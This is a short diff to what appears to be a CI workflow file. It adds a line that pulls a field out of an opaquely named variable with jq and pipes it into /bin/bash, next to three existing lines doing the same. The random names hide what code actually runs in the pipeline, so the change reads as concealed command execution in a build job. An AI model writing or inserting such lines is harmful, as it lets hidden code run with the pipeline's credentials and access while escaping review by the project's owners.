@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$r73" | jq -r .vt47860 | /bin/bash
           echo $zael0 | jq -r .wknp1 | /bin/bash
           echo $cey2 | jq -r .z3 | /bin/bash
+          echo $uv6785 | jq -r .oqzt1879 | /bin/bash
 
       - name: Upload data
         if: always()
